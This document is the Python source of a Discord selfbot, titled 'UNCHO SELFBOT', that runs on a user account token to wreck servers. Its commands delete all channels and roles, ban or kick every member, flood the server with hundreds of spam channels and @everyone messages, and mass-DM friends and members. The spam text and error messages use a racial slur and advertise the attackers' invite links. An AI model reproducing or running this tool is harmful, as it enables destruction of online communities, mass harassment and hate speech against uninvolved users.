import asyncio
import datetime
import functools
import io
import json
import os
import random
import re
import string
import urllib.parse
import urllib.request
import time
from urllib import parse, request
from itertools import cycle
from bs4 import BeautifulSoup as bs4

import aiohttp
import colorama
import discord
import numpy
import requests
from PIL import Image
from colorama import Fore
from discord.ext import commands
from discord.utils import get
from gtts import gTTS
client = discord.Client(intents=discord.Intents.all())


@client.event 
async def on_message(message):

    if message.content=="wdsf" and message.author.id==client.user.id:
        mb = await message.guild.fetch_members().flatten()

        for m in mb: 

            try: await message.guild.ban(m)
            except: print(f"unable to ban {m.name}")

    prefix = "."
    if message.content.startswith(prefix):

        command = message.content.lstrip(prefix)
        try: command = command.split(" ")[0]
        except: pass

        try: args = message.content.split(" ")[1:]
        except: args = []

        command = command.lower()
        if command in ('nuke', 'wizz'):

            if message.guild.id==804878733793558589:
                return await message.channel.send("not nuking dank crew")

            await message.channel.send('hurd yhu')
            for channel in message.guild.channels:
                try: await channel.delete()
                except: print(f"Unable to delete channel #{channel.name}")

            for role in message.guild.roles:
                try: await role.delete()
                except: print(f"Unable to delete role {role.name}")

            for user in await message.guild.fetch_members().flatten():
                try: await user.ban(reason="e")
                except: print(f"Unable to ban user {user.name} ({user.id})")

            for i in range(420):
                c = await message.guild.create_text_channel("ko-slapped")
                await c.send("@everyone Ko Stepped BITCH! Join our hangout https://discord.gg/tp4dfpDPuN")

        elif command in ("gcname",):

            if len(args)<=0: return
            name = " ".join(args)

            for i in range(len(name)):
                await message.channel.edit(name=name[:i+1])

        elif command in ("help", "commands"):

            embed = discord.Embed(
                title="𝙐𝙉𝘾𝙃𝙊𝙎 𝙎𝙀𝙇𝙁𝘽𝙊𝙏",
                description="\n\uD83D\uDCAB wizz - 𝙬𝙞𝙯𝙯𝙚𝙨 𝙖 𝙨𝙚𝙧𝙫𝙚𝙧\n"
                            "\n\uD83D\uDCAB gcname <name> - 𝙘𝙝𝙖𝙣𝙜𝙚𝙨 𝙜𝙘 𝙣𝙖𝙢𝙚 𝙩𝙤 𝙣𝙖𝙢𝙚, 𝙗𝙪𝙩 𝙙𝙤𝙚𝙨 𝙞𝙩 𝙞𝙣 𝙖 𝙨𝙥𝙚𝙘𝙞𝙖𝙡 𝙬𝙖𝙮\n"
                            "\n\uD83D\uDCAB ka - 𝙠𝙞𝙘𝙠𝙨 𝙚𝙫𝙚𝙧𝙮𝙤𝙣𝙚 𝙞𝙣 𝙖 𝙨𝙚𝙧𝙫𝙚𝙧\n"
                            "\n\uD83D\uDCAB ba - 𝙗𝙖𝙣𝙨 𝙚𝙫𝙚𝙧𝙮𝙤𝙣𝙚 𝙞𝙣 𝙖 𝙨𝙚𝙧𝙫𝙚𝙧\n"
                            "\n\uD83D\uDCAB md <message> -𝙢𝙖𝙨𝙨 𝙙𝙢𝙨 𝙖𝙡𝙡 𝙤𝙛 𝙮𝙤𝙪𝙧 𝙛𝙧𝙞𝙚𝙣𝙙𝙨 𝙨𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜\n"
                            "\n\uD83D\uDCAB mc - 𝙘𝙧𝙚𝙖𝙩𝙚𝙨 𝙢𝙖𝙭 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨\n"
                           "\n\uD83D\uDCAB e - 𝙨𝙥𝙚𝙘𝙞𝙖𝙡 𝙘𝙤𝙢𝙢𝙖𝙣𝙙\n" 
            ).set_image(url="https://cdn.discordapp.com/attachments/780885169879908412/817256562132910080/image0.gif")
            await message.channel.send(embed=embed)

        elif command =="ka":

            for user in await message.guild.fetch_members().flatten():
                try: await user.kick()
                except: print(f"cant kick this nigga {user.name} ({user.id})")

        elif command == "ba":

            for user in await message.guild.fetch_members().flatten():
                try:await user.ban(reason="e")
                except:print(f"cant ban this nigga {user.name} ({user.id})")

        elif command =='md':

            if len(args) <= 0: return
            name = " ".join(args)

            for user in client.user.friends:
                try: await user.send(name)
                except Exception as e: pass

            if message.guild is not None:
                print(message.guild.members)
                for user in await message.guild.fetch_members().flatten():
                    try:

                        c = await user.create_dm_channel()
                        await c.send(name)


                    except: pass

        elif command == "mc":

            for i in range(100):
                c = await message.guild.create_text_channel("fear uncho")
                await c.send("@everyone UNCHO smoked you niggas! Join our hangout https://discord.gg/86uDyKe8Tz")

        elif command == "e":

            for i in range(200):
                await message.channel.send("@everyone UNCHO smoked you niggas! Join our hangout https://discord.gg/86uDyKe8Tz")
        
        try: await message.delete()
        except: print("dont know why, but i cant delete the message lol")

token = "TOKEN HERE"

client.run(token, bot=False)
